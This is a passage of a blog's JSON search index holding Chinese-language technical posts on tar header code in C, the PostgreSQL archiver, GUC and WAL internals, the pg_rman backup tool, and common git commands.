TAR_HEADER_LENGTH ; i++ ) if (i &lt; 148 || i &gt;= 156) sum += 0xFF &amp; header[i]; return sum;&#125;enum tarErrortarCreateHeader(char *header, const char *filename, const char *linktarget, struct stat *filebuf)&#123; struct passwd *userinfo = NULL; struct group *groupinfo = NULL; if (strlen(filename) &gt; 99) return TAR_NAME_TOO_LONG; if (linktarget &amp;&amp; strlen(linktarget) &gt; 99) return TAR_SYMLINK_TOO_LONG; memset(header, 0, TAR_HEADER_LENGTH); strncpy(&amp;header[0], filename, 100); //filename[100] if (linktarget != NULL || S_ISDIR(filebuf-&gt;st_mode)) &#123; int flen = strlen(filename); flen = flen &gt; 99 ? 99 : flen; header[flen] = '/'; header[flen + 1] = '\\0'; &#125; write_tar_number(&amp;header[100], 8, ( filebuf-&gt;st_mode &amp; 07777)); write_tar_number(&amp;header[108], 8, filebuf-&gt;st_uid); write_tar_number(&amp;header[116], 8, filebuf-&gt;st_gid); if (linktarget != NULL || S_ISDIR(filebuf-&gt;st_mode)) write_tar_number(&amp;header[124], 12, 0); else write_tar_number(&amp;header[124], 12, filebuf-&gt;st_size); //size = file size; write_tar_number(&amp;header[136], 12, filebuf-&gt;st_mtime); //modify time; // 156byte is typeflag; if (linktarget != NULL) &#123; header[156] = '2'; strncpy(&amp;header[157], linktarget, 100); &#125; else if (S_ISDIR(filebuf-&gt;st_mode)) header[156] = '5'; //else if (S_ISBLK(filebuf-&gt;st_mode)) // header[156] = '4'; //else if (S_ISCHR(filebuf-&gt;st_mode)) // header[156] = '3'; //else if(S_ISFIFO(filebuf-&gt;st_mode)) // header[156] = '6'; else header[156] = '0'; strcpy(&amp;header[257], \"ustar\"); //magic memcpy(&amp;header[263], \"00\", 2); //version; userinfo = getpwuid(filebuf-&gt;st_uid); groupinfo = getgrgid(filebuf-&gt;st_gid); strncpy(&amp;header[265], userinfo-&gt;pw_name, 32); //u name; strncpy(&amp;header[297], groupinfo-&gt;gr_name, 32); //g name; write_tar_number(&amp;header[329], 8, 0); //major; write_tar_number(&amp;header[337], 8, 0); //minor; write_tar_number(&amp;header[148], 8, tarCheckSum(header)); //checksum;; return TAR_OK; 填充文件数据123456789101112131415161718192021222324252627282930313233343536373839404142void writeTarData(FILE *tarfile, char *buf, int r, char *current_file)&#123; if (fwrite(buf, r, 1, tarfile) != 1) &#123; fprintf(stderr, (\"%s: could not write to file \\\"%s\\\": %s\\n\"), \"cs51-tar\", current_file, strerror(errno)); exit(1); &#125;&#125;#define WRITE_TAR_DATA(buf, sz) writeTarData(tarfile, buf, sz, filename)main:: for (int i = 0; i &lt; file num; i++) &#123; fp = fopen(file[i], \"r\");// printf(\"append %s\\n\", file[i]); memset(zerobuf, 0, sizeof(zerobuf)); stat(file[i], &amp;filebuf); header = (char *)malloc(sizeof(char) * TAR_HEADER_LENGTH); memset(header, 0, TAR_HEADER_LENGTH); //context file ; context = (char *)malloc(sizeof(char) * filebuf.st_size); fread(context, 1, filebuf.st_size, fp); tarCreateHeader(header, file[i], NULL, &amp;filebuf); padding = ((filebuf.st_size + 511) &amp; ~511) - filebuf.st_size; WRITE_TAR_DATA(header, TAR_HEADER_LENGTH); WRITE_TAR_DATA(context /*file data*/, filebuf.st_size); if (padding) WRITE_TAR_DATA(zerobuf, padding); &#125; WRITE_TAR_DATA(zerobuf, sizeof(zerobuf));","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"},{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"Postgresql Arch process","slug":"PostgreSQL/2019-08-26-Postgresql-pgarch","date":"2019-08-26T11:12:20.000Z","updated":"2019-09-18T12:18:14.310Z","comments":true,"path":"2019/08/26/PostgreSQL/2019-08-26-Postgresql-pgarch/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/08/26/PostgreSQL/2019-08-26-Postgresql-pgarch/","excerpt":"归档信息文件 .backup archive_status文件夹 Postgresql arch process 进程解析","text":"归档信息文件 .backup archive_status文件夹 Postgresql arch process 进程解析 归档文件000000010000000000000002.000000D0.backup do_pg_stop_backup() 产生backup 信息文件 1234#define BackupHistoryFilePath(path, tli, logSegNo, offset) \\ snprintf(path, MAXPGPATH, XLOGDIR \"/%08X%08X%08X.%08X.backup\", tli, \\ (uint32) ((logSegNo) / XLogSegmentsPerXLogId), \\ (uint32) ((logSegNo) % XLogSegmentsPerXLogId), offset) Start WAL Location: offset; archive_status作用用于标记文件拷贝情况. postgres: archiver processpostmaster.c:PostmasterMain()1pqsignal_no_restart(SIGCHLD, reaper); postmaster.c:reaper()12345678910111213/* * reaper -- signal handler to cleanup after a child process dies; */static void reaper(SIGNAL_ARGS); //内部pgarch实现; if (pid == PgArchPID) &#123; PgArchPID = 0; if (PgArchStartupAllowed()) PgArchPID = pgarch_start(); continue; &#125; pgarch.c:pgarch_ArchiverCopyLoop() 使用.ready的archive_status循环遍历所有xlog并归档它们… 大多数情况下我们希望这是一个单独文件, 后端会将这些文件添加到需要归档的列表中. 而我们仍在复制早期的归档文件. pgarch.c:pgarch_archiveXlog() Invokes system(3) to copy one archive file to wherever it should go Returns true if successful 1rc = system(xlogarchcmd); 利用postgresql.conf中archive_command的参数. 进行系统拷贝; pgarch.c:pgarch_archiveDone() Emit notification that an xlog file has been successfully archived. We do this by renaming the status file from XXXX.ready to XXXX.done. Eventually, a checkpoint process will notice this and delete both the XXXX.done file and the xlog file itself. – 检查点进程将会清理xxx.done 和 xlog本身文件. 实现: 1234567891011static voidpgarch_archiveDone(char *xlog)&#123; char rlogready[MAXPGPATH]; char rlogdone[MAXPGPATH]; StatusFilePath(rlogready, xlog, \".ready\"); StatusFilePath(rlogdone, xlog, \".done\"); (void) durable_rename(rlogready, rlogdone, WARNING);&#125; xlogarchve.c XLogArchiveNotify Create an archive notification file XLogArchiveNotifySeg Convenience routine to notify using segment number representation of filename XLogArchiveForceDone Emit notification forcibly that an XLOG segment file has been successfully archived, bu creating \\.done regardless of whether \\.ready exists or not. XLogArchiveCheckDone XLogArchiveIsBusy Check to see if an XLOG segment file is still unarchived XLogArchiveIsReadyOrDone XLogArchiveIsReady Check to see if an XLOG segment file has an archive notification (.ready) file. XLogArchiveCleanup Cleanup archive notification file(s) for a particular xlog segment","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"git command","slug":"software/git-command","date":"2019-08-25T14:10:37.000Z","updated":"2019-09-11T12:13:37.042Z","comments":true,"path":"2019/08/25/software/git-command/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/08/25/software/git-command/","excerpt":"git 常用命令: git stat git command git whatchanged git show git checkout git reset git commit git diff/apply git clean git branch git log git cherry-pick git rebase git merge","text":"git 常用命令: git stat git command git whatchanged git show git checkout git reset git commit git diff/apply git clean git branch git log git cherry-pick git rebase git merge 查看改动文件 git status 未add1234567891011[ligang@yfslcentos71 hgdb-9-15]$ git status # On branch ora-fun# Changes not staged for commit:# (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)# (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)## modified: src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c#no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)[ligang@yfslcentos71 hgdb-9-15]$ git add src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c[ligang@yfslcentos71 hgdb-9-15]$ git commit -m &quot;删除文件注释&quot; 修改最后一次提交作者信息修改最后一次提交1git commit --amend --author=\"ligang &lt;ligang@highgo.com&gt;\" 连续几次1git rebase -i HEAD~3 将pick修改为edit12345Stopped at 230fe3404df2790712209e8797923d6af47a42c7... add contentYou can amend the commit now, with git commit --amendOnce you are satisfied with your changes, run git rebase --continue 此时，用户首先要使用git commit –amend -author修改该提交的作者信息，接着执行git rebase –continue继续修改下一个提交：12$ git commit --amend --author=\"Dennis &lt;dennis@top500corp.com&gt;\" --no-edit$ git rebase --continue 依次修改即可 git whatchanged –stat 每次修改的文件列表, 及文件修改的统计 已经add12345678910111213141516171819[ligang@yfslcentos71 hgdb-9-15]$ git whatchanged --stat commit 5afb2d3426637fedb1fe6b5fa525091028005eedAuthor: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:35:33 2018 +0800 删除文件注释 src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c | 2 -- 1 file changed, 2 deletions(-)commit 593a62120591211eeaf598e059ec67f9c079dd39Author: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:25:02 2018 +0800 修改完成 src/backend/parser/parse_node.c | 26 ++++++++++++++++++++++---- src/bin/initdb/initdb.c | 2 ++ 2 files changed, 24 insertions(+), 4 deletions(-) 查看Commit改动 git show123456789101112131415161718192021222324[ligang@yfslcentos71 hgdb-9-15]$ git show src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.ccommit 5afb2d3426637fedb1fe6b5fa525091028005eedAuthor: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:35:33 2018 +0800 删除文件注释diff --git a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.cindex ae6f262..ee61b5d 100644--- a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c+++ b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c@@ -1170,12 +1170,10 @@ Datum orafnp_decode(PG_FUNCTION_ARGS) if (!OidIsValid(resulttype)) elog(ERROR, &quot;could not determine data type of decode() input&quot;); - //ligang_change_begin if( 4 == nargs &amp;&amp; UNKNOWNOID == searchtype) &#123; searchtype = TEXTOID; &#125;- //ligang_change_end if (nargs % 2 == 0) &#123; 放弃本地所有修改 git checkout . 未使用 git add1git checkout -- filename ## -- 指定当前版本, 可以指定commit id; 放弃已经缓存的修改 git reset 使用 git add .12可以使用 git reset HEAD filepathname （比如： git reset HEAD readme.md）来放弃指定文件的缓存，放弃所有的缓存可以使用 git reset HEAD . 撤销提交的Commit1git reset --options HEAD~n –mixed 不删除工作空间改动代码，撤销commit，并且撤销git add . –soft 不删除工作空间改动代码，撤销commit，不撤销git add . –hard 删除工作空间改动代码，撤销commit，撤销git add . 推回 commit 状态 已经使用add .12git reset --hard HEADgit reset --hard commitid 将commit id 作为分支:1git checkout -b ligang-read commit`id 文件diff12345git diff ## 可以对比分支;git diff brach-name &gt; ../change.diff git apply --check ../change.diff ## 检查diff是否可用 对比不同commit的文件1git diff hash1 hash2 filename 清除未识别 - 恢复原始12git checkout .git clean -d -fx 重命名分支:1git branch -m oldName newName 删除远程分支1git push --delete origin oldName 把修改后的本地分支 与 远程分支关联1git branch --set-upstream-to origin/newName 查看文件所有提交历史 git log -p1git log -p fileName 追踪函数在git历史中的变化;1git log -L :checksum_bctlist:src/backend/postmaster/bct.c 合并commit id:1git rebase -i &lt;startpointer&gt; &lt;endpointer&gt; 1git rebase -i HEAD~n ##n 代表要合并的commit数目; 可以只写startpointer ; 在编辑合并界面， 进行pick sque 操作; 合并某个分支上的单个commitdd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master] ​ \\ ​ 76cada - 62ecb3 - b886a0 [feature] feature 分支上的commit 62ecb3 非常重要，它含有一个bug的修改，或其他人想访问的内容。无论什么原因，你现在只需要将62ecb3 合并到master，而不合并feature上的其他commits，所以我们用git cherry-pick命令来做： 123git checkout mastergit cherry-pick 62ecb3 现在62ecb3 就被合并到master分支，并在master中添加了commit（作为一个新的commit）. 合并某个分支的一系列commit;合并单个commit可能并不满足, 需要合并一些列相连的commits; 这种情况需要使用rebase. dd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master] ​ \\ ​ 76cada - 62ecb3 - b886a0 [feature] 首先需要基于feature创建一个新的分支，并指明新分支的最后一个commit： 1git checkout -b newbranch 62ecb3 然后，rebase将这个新的分支commit合并到master( –onto masdter). 76cada^ 指明你想从哪个特定的commit开始。 1git rebase --onto master 76cada^ 得到结果, 就是feature分支的commit 76cada ~62ecb3 都被合并到了master分支。 Merge 合并分支git merge命令用于合并指定分支到当前分支。 合并后，在查看readme.txt的内容;","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Git","slug":"Git","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Git/"}]},{"title":"Postgresql rman","slug":"PostgreSQL/2019-07-20-Postgresql-rman","date":"2019-08-15T12:27:32.000Z","updated":"2019-09-18T12:17:56.042Z","comments":true,"path":"2019/08/15/PostgreSQL/2019-07-20-Postgresql-rman/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/08/15/PostgreSQL/2019-07-20-Postgresql-rman/","excerpt":"联机程序. 并且目标数据库必须处于归档模式。 支持在线全备, 增量备份, 归档备份 增量备份基于已经存在的一个全库备份 rman 本身使用pg_start_backup(), copy, pg_stop_backup() 备份模式 本身采用的是文本拷贝… cp/fwrite; pg_start_backup() text 用户定义的标签, 是备份转储文件将被存储的名字 boolean 指尽快执行pg_start_backup. 这将会强制一个立即执行的检查点, 会导致I/O操作的峰值, 拖慢任何并发执行的查询. boolean 如果为false, 则在完成备份后, pg_stop_backup将立即返回，而无需等待WAL归档 pg_stop_backup() 差异备份与累计备份","text":"联机程序. 并且目标数据库必须处于归档模式。 支持在线全备, 增量备份, 归档备份 增量备份基于已经存在的一个全库备份 rman 本身使用pg_start_backup(), copy, pg_stop_backup() 备份模式 本身采用的是文本拷贝… cp/fwrite; pg_start_backup() text 用户定义的标签, 是备份转储文件将被存储的名字 boolean 指尽快执行pg_start_backup. 这将会强制一个立即执行的检查点, 会导致I/O操作的峰值, 拖慢任何并发执行的查询. boolean 如果为false, 则在完成备份后, pg_stop_backup将立即返回，而无需等待WAL归档 pg_stop_backup() 差异备份与累计备份 rman整体架构 默认配置参数: PGDATA BACKUP_PATH ARCLOG_PATH pg_rman init pg_rman show pg_rman config –list pg_rman backup -b full ​ -b inc [incremental] ​ ​ ​ -b arch [archive] pg_rman restore [新增功能] pg_rman blockrecover –datafile tablespaceOid/databaseOid/relfilenode –block 0 备份策略 恢复窗口: 指定天数. 默认值为 7. 备份数量: 冗余度保留。 默认值为 1. 代码组织架构:123456789101112131415161718192021222324252627.├── backup.c├── blockrecover.c├── catalog.c├── COPYRIGHT├── data.c├── delete.c├── dir.c├── docs├── expected├── idxpagehdr.h├── init.c├── Makefile├── parray.c├── parray.h├── pg_rman.c├── pg_rman.h├── pgsql_src├── pgut├── README.md├── restore.c├── script├── show.c├── sql├── util.c├── validate.c└── xlog.c pg_rman-源码浅析代码阅读 12345678910111213* +----------------+---------------------------------+ * | PageHeaderData | linp1 linp2 linp3 ... | * +-----------+----+---------------------------------+ * | ... linpN | | * +-----------+--------------------------------------+ * | ^ pd_lower | * | | * | v pd_upper | * +-------------+------------------------------------+ * | | tupleN ... | * +-------------+------------------+-----------------+ * | ... tuple3 tuple2 tuple1 | \"special space\" | * +--------------------------------+-----------------+ 如果有数据刷入, 那么将会做持久化，数据库页头部的pd_lsn表示该数据库页最后一次变化时, 变化产生的REDO在wal file中的结束为止. 如果wal flush的lsn插入位置 大于或者等于这个pd_lsn将表示这个页的更改是可靠的. 即每次修改都将发生块的变化: 包含LSN的修改. 即可以通过第一次备份开始时的全局LSN, 以及当前需要备份的数据的Page LSN来判断此页是否发生过修改. 修改了即备份，没修改不需要备份, 从而实现数据库的块级别增量备份 增量备份关联代码: 123456789101112131415161718 pgBackupGetPath(prev_backup, prev_file_txt, lengthof(prev_file_txt), DATABASE_FILE_LIST); prev_files = dir_read_file_list(pgdata, prev_file_txt); /* * Do backup only pages having larger LSN than previous backup. */ lsn = &amp;prev_backup-&gt;start_lsn; xlogid = (uint32) (*lsn &gt;&gt; 32); xrecoff = (uint32) *lsn; elog(DEBUG, _(\"backup only the page updated after LSN(%X/%08X)\"), xlogid, xrecoff);/* Construct the directory for this backup within BACKUP_PATH. */pgBackupGetPath(&amp;current, path, lengthof(path), DATABASE_DIR);/* Save the files listed above. */backup_files(pgdata, path, files, prev_files, lsn, current.compress_data, NULL); [新增]块恢复代码: 12345678910111213141516171819202122232425262728293031323334353637383940for (loop = 0; loop &lt;= brc.base_index; loop++)&#123; backup = (pgBackup *) parray_get(backups, loop); /* don't use incomplete nor different timeline backup */ if (backup-&gt;status != BACKUP_STATUS_OK || backup-&gt;tli != base_backup-&gt;tli) continue; if(-1 == brc.lastBackupIndex &amp;&amp; HAVE_ARCLOG(backup) &amp;&amp; brc.last_needed_index &gt;= loop) &#123; restore_archive_logs(backup,true); &#125; /* use database backup only */ if (BACKUP_MODE_INCREMENTAL &gt; backup-&gt;backup_mode || brc.last_needed_index &lt; loop) continue; elog(DEBUG, \"found backup BK_KEY: \\\"%d\\\" can be used \",backup-&gt;backup_id); recoverBackup(backup,loop); =&gt; [[ for(loop = 0; loop &lt; brc.rbNum; loop++) &#123; /*If this block has find a page,skip it*/ if(brc.pageArray[loop]) &#123; elog(DEBUG,\"block \\'%u\\' has find it's page,skip.\",brc.recoverBlock[loop]); continue; &#125; page = findPageInBackup(backup, brc.recoverBlock[loop]); if(page) &#123; brc.pageArray[loop] = page; if(-1 == brc.lastBackupIndex) &#123; brc.lastBackupIndex = backupindex; elog(DEBUG,\"Find last backup can be used:BK_KEY \\'%d\\'\",backup-&gt;backup_id); &#125; &#125; &#125; ]]&#125; 问题: 随意增大filenode大小, 即无法整除8192时, 会默认增大一个Page。 此时的Page是不完整的. pg默认不开启checksum校验. 因此Pg会提示blk Num无效, 进行blockrecover操作时, 将会发生无法恢复. 因为整个filenode本身就没有正确的此Page; 当随意修改Page数据时, 有时会发生显示数据不全，即数据条目与插入条目不符的情况. 此时Pg本身无法正常的数据异常告警. 请开启checksum. 进行验证. checkSum异常告警; 1WARNING: 01000: page verification failed, calculated checksum 11654 but expected 8293 确定table的tuple Num 确定table的page Num 确保开启checksum功能, 保证Page的数据正常. 但对上述问题不产生有效影响;;","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql Guc","slug":"PostgreSQL/2019-08-12-Postgresql-GUC","date":"2019-08-12T12:27:32.000Z","updated":"2019-09-18T12:18:02.450Z","comments":true,"path":"2019/08/12/PostgreSQL/2019-08-12-Postgresql-GUC/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/08/12/PostgreSQL/2019-08-12-Postgresql-GUC/","excerpt":"GUC: Grand Unified Configuration 指的是postgreSQL数据库的一种对数据库变量进行设置对数据库进行控制的机制。通常理解是对postgresql.conf文件中变量进行修改，或通过set命令对参数进行设置。但实际上GUC变量的种类，设置方法要更加复杂多样。在guc.h和guc.c中可以看到GUC变量的详细实现。","text":"GUC: Grand Unified Configuration 指的是postgreSQL数据库的一种对数据库变量进行设置对数据库进行控制的机制。通常理解是对postgresql.conf文件中变量进行修改，或通过set命令对参数进行设置。但实际上GUC变量的种类，设置方法要更加复杂多样。在guc.h和guc.c中可以看到GUC变量的详细实现。 Guc相关结构 bool 12345678910111213struct config_bool&#123; struct config_generic gen; /* constant fields, must be set correctly in initial value: */ bool *variable; bool boot_val; GucBoolCheckHook check_hook; GucBoolAssignHook assign_hook; GucShowHook show_hook; /* variable fields, initialized at runtime: */ bool reset_val; void *reset_extra;&#125;; int 123456789101112131415struct config_int&#123; struct config_generic gen; /* constant fields, must be set correctly in initial value: */ int *variable; int boot_val; int min; int max; GucIntCheckHook check_hook; GucIntAssignHook assign_hook; GucShowHook show_hook; /* variable fields, initialized at runtime: */ int reset_val; void *reset_extra;&#125;; real 123456789101112131415struct config_real&#123; struct config_generic gen; /* constant fields, must be set correctly in initial value: */ double *variable; double boot_val; double min; double max; GucRealCheckHook check_hook; GucRealAssignHook assign_hook; GucShowHook show_hook; /* variable fields, initialized at runtime: */ double reset_val; void *reset_extra;&#125;; string 12345678910111213struct config_string&#123; struct config_generic gen; /* constant fields, must be set correctly in initial value: */ char **variable; const char *boot_val; GucStringCheckHook check_hook; GucStringAssignHook assign_hook; GucShowHook show_hook; /* variable fields, initialized at runtime: */ char *reset_val; void *reset_extra;&#125;; enum 1234567891011121314struct config_enum&#123; struct config_generic gen; /* constant fields, must be set correctly in initial value: */ int *variable; int boot_val; const struct config_enum_entry *options; GucEnumCheckHook check_hook; GucEnumAssignHook assign_hook; GucShowHook show_hook; /* variable fields, initialized at runtime: */ int reset_val; void *reset_extra;&#125;; 每一个类型建立一个对应的静态数组. 用于存储相应的Guc类型 src/backend/utils/misc/guc.c Guc作用上下文:12345678910typedef enum&#123; PGC_INTERNAL, PGC_POSTMASTER, PGC_SIGHUP, PGC_SU_BACKEND, PGC_BACKEND, PGC_SUSET, PGC_USERSET&#125; GucContext; Internal 无法被用户修改, 只能被内部进程设置, show 命令能查看此类变量, 通常在编译时设置与改变. Postmaster在postmaster进程启动时通过读取configure文件或命令行来设置。 这类变量的改变在postgresql重启时生效. Sighup在postmaster进程启动或向postmaster 或backend进程发sighup信号来读取configure文件时设置. Backend在新的backend进程启动时读取configure文件生效. Suset 指超级用户修改生效, 不需要重新读取configure文件. User 指普通用户修改生效, 在当前会话下有效, 无需读取configure文件. Guc 分组123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051enum config_group&#123; UNGROUPED, FILE_LOCATIONS, CONN_AUTH, CONN_AUTH_SETTINGS, CONN_AUTH_SECURITY, RESOURCES, RESOURCES_MEM, RESOURCES_DISK, RESOURCES_KERNEL, RESOURCES_VACUUM_DELAY, RESOURCES_BGWRITER, RESOURCES_ASYNCHRONOUS, WAL, WAL_SETTINGS, WAL_CHECKPOINTS, WAL_ARCHIVING, REPLICATION, REPLICATION_SENDING, REPLICATION_MASTER, REPLICATION_STANDBY, REPLICATION_SUBSCRIBERS, QUERY_TUNING, QUERY_TUNING_METHOD, QUERY_TUNING_COST, QUERY_TUNING_GEQO, QUERY_TUNING_OTHER, LOGGING, LOGGING_WHERE, LOGGING_WHEN, LOGGING_WHAT, PROCESS_TITLE, STATS, STATS_MONITORING, STATS_COLLECTOR, AUTOVACUUM, CLIENT_CONN, CLIENT_CONN_STATEMENT, CLIENT_CONN_LOCALE, CLIENT_CONN_PRELOAD, CLIENT_CONN_OTHER, LOCK_MANAGEMENT, COMPAT_OPTIONS, COMPAT_OPTIONS_PREVIOUS, COMPAT_OPTIONS_CLIENT, ERROR_HANDLING_OPTIONS, PRESET_OPTIONS, CUSTOM_OPTIONS, DEVELOPER_OPTIONS&#125;; 保存命令 1alter system set military_sensitive_data = '0'; 将会把参数刷出到磁盘文件postgresql.auto.conf 123# Do not edit this file manually!# It will be overwritten by the ALTER SYSTEM command.military_sensitive_data = '0' Guc变量分析123456789&#123; &#123;\"lc_numeric\", PGC_USERSET, CLIENT_CONN_LOCALE, gettext_noop(\"Sets the locale for formatting numbers.\"), NULL &#125;, &amp;locale_numeric, \"C\", check_locale_numeric, assign_locale_numeric, NULL&#125;, 12345boolcheck_locale_numeric(char **newval, void **extra, GucSource source)&#123; return check_locale(LC_NUMERIC, *newval, NULL);&#125;","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql Wal","slug":"PostgreSQL/2019-07-19-Postgresql-WAL","date":"2019-07-19T12:27:32.000Z","updated":"2019-09-20T03:10:14.000Z","comments":true,"path":"2019/07/19/PostgreSQL/2019-07-19-Postgresql-WAL/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/07/19/PostgreSQL/2019-07-19-Postgresql-WAL/","excerpt":"unde &amp; redoundo – 回滚; redo – 前滚恢复: 发生崩溃时, 进行数据恢复, 通过已存在的预写式日志(WAL)来重新恢复数据库.","text":"unde &amp; redoundo – 回滚; redo – 前滚恢复: 发生崩溃时, 进行数据恢复, 通过已存在的预写式日志(WAL)来重新恢复数据库. Wal预写式日志(WAL)是保证数据完整性的一种标准方法。 ​ WAL的中心概念是数据文件(存储表 和 索引) 的修改[select操作并不会被记录]必须在这些动作被日志记录之后才会被写入, 即在描述这些改变的日志记录被刷到持久存储以后。 ​ 因此我们不需要在每个事务提交时刷写数据页面到磁盘，因为我们知道发生崩溃时可以通过日志来恢复数据库。任何还没有被应用到数据页面的改变可以根据其日志记录进行重做。即前滚恢复。 如果数据库在异步提交和事务WAL记录写入之间的风险窗口期间崩溃，在该事务期间所作的修改将丢失。 后台进程(“WAL写进程”)每wal_writer_delay毫秒就会把未写入的wal记录刷写到磁盘。 风险窗口实际的最大持续时间是 wal_writer_delay的3倍，因为wal写进程被设计成倾向于在忙时一次写入所有页面。 commit_delay Sets the delay in microseconds between transaction commit and flushing WAL to disk.; wal段: 文件命令组成:1234#define XLogFilePath(path, tli, logSegNo) \\ snprintf(path, MAXPGPATH, XLOGDIR \"/%08X%08X%08X\", tli, \\ (uint32) ((logSegNo) / XLogSegmentsPerXLogId), \\ (uint32) ((logSegNo) % XLogSegmentsPerXLogId)) 组成共 3 * 8 =&gt; 24位; 分别由 ThisTimeLineID, logSegNo / XLogSegmentsPerXLogId, logSegNo % XLogSegmentsPerXLogId. 构成; 时间线: 从1开始,接收到ArchiveRecoveryRequested [.conf 存在归档恢复] 时， findNewestTimeline + 1; logSegNo: 1static XLogSegNo openLogSegNo = 0; 时间线 ​ 1 日志文件标号: ​ 5EA 日志文件段标号: ​ 9 1printf %d 0x95FA20 ===&gt; 9828896 为什么用6位16进制. 16^^6 =&gt; 16777216 =&gt; 16 * 1024 * 1024 =&gt; 16M; Wal相关函数 pg_current_wal_lsn() pg_current_wal_insert_lsn() 显示当前预写日志插入位置. pg_current_wal_flush_lsn() 显示当前预写日志刷新位置; pg_wal_lsn_diff() 以字节数计算两个预写日志位置之间的差别.. select pg_wal_lsn_diff ( pg_current_wal_insert_lsn(), pg_current_wal_lsn()); pg_wal_replay_pause() 立即暂停恢复. (仅限于超级用户..) pg_wal_replay_resume() 如果恢复被暂停, 重启之.. pg_rman redo; -&gt; blockrecover; 对照相应的lsn 查找对应的wal file; 按照其偏移 - 1234567targetPgePtr = LSN - ( LSN % XLOG_BLCKSZ);targetRecoff = LSN % XLOG_BLCKSZ;readOff = ReadPageINternal_rman(state, targetPagePtr, Min(targetRecOff + SizeOfXlogRecord, XLOG_BLCKSZ)) Wal file 结构 内存布局: XLogLongPageHeaderData – 40byte prev xlog record – 16byte [First Page] Xlog Record – 24byte Xlog Record Block Header – 4byte 【0-N】 0..N个XLogRecordBlockHeader,每个XLogRecordBlockHeader对应一个block data;注意:如设置了BKPBLOCK_HAS_IMAGE标记,则在XLogRecordBlockHeader结构体后跟XLogRecordBlockImageHeader结构体; 如设置了BKPIMAGE_HAS_HOLE和 BKPIMAGE_IS_COMPRESSED, 则在XLogRecordBlockImageHeader后跟XLogRecordBlockCompressHeader结构体; XLogRecordDataHeader[Short | Long ] 12345typedef struct XLogRecordDataHeaderShort&#123; uint8 id; /* XLR_BLOCK_ID_DATA_SHORT */ uint8 data_length; /* number of payload bytes */&#125; XLogRecordDataHeaderShort; uint8 data_length 是指main data的大小. 3字节的结构. block Data xl_heap_header Tuple data length = [ XLOG Record’s len ] - [ sizeof(xlog record block header) ] - [ sizeof(xlog record data header[short | long]) ] - [ xl_heap_header ] - [ main_data ] main Data WAL 按照PageSize [8192] 进行排列. 第一个Page才会使用此struct 1234567typedef struct XLogLongPageHeaderData ==&gt; 40byte&#123; XLogPageHeaderData std; /* standard header fields */ 24byte uint64 xlp_sysid; /* system identifier from pg_control */ 8byte uint32 xlp_seg_size; /* just as a cross-check */ 4byte uint32 xlp_xlog_blcksz; /* just as a cross-check */ 4byte&#125; XLogLongPageHeaderData; 其余Page使用… 123456789101112131415161718typedef struct XLogPageHeaderData ==&gt; 24byte&#123; uint16 xlp_magic; /* magic value for correctness checks */ 2byte uint16 xlp_info; /* flag bits, see below */ 2byte TimeLineID xlp_tli; /* TimeLineID of first record on page */ 4byte XLogRecPtr xlp_pageaddr; /* XLOG address of this page */ 8byte /* * When there is not enough space on current page for whole record, we * continue on the next page. xlp_rem_len is the number of bytes * remaining from a previous page. * * Note that xl_rem_len includes backup-block data; that is, it tracks * xl_tot_len not xl_len in the initial header. Also note that the * continuation data isn't necessarily aligned. */ uint32 xlp_rem_len; /* total len of remaining data for record */ 4byte&#125; XLogPageHeaderData; 记录每个Record: 12345678910111213141516171819202122232425262728293031323334/* * The overall layout of an XLOG record is: * Fixed-size header (XLogRecord struct) * XLogRecordBlockHeader struct * 